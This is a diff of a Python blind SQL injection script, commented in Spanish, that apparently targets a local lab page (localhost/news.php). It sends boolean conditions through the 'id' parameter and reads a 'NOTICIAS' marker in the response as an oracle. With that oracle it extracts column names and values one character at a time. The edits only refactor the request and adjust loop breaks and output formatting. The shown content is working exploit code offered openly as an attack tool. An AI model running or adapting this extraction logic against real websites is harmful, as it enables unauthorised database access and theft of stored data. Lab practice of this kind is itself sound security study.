@@ -6,8 +6,7 @@ def condiccion_logica(condition):
     Lanza una petición con una condición booleana
     y devuelve True / False según la respuesta
     """
-    payload = condition  # <-- aquí va tu payload blind
-    r = requests.get("http://localhost/news.php", params={"id": payload})
+    r = requests.get("http://localhost/news.php", params={"id": condition})
 
     if "NOTICIAS" in r.text:
         return True
@@ -35,8 +34,6 @@ def extrae_nombre_columnas(max_columns=10, max_len=20):
                 """
                 if condiccion_logica(condition):
                     name += c
-                    break
-                else:
                     break
 
         if name:
@@ -67,11 +64,11 @@ def extrae_valor_columna(columna, max_rows=10, max_len=50):
                 if condiccion_logica(condition):
                     value += c
                     break
-            else:
-                break
+                else:
+                    break
 
         if value:
-            print(f"  - {value}")
+            print(f"- {value}")
         else:
             break
 
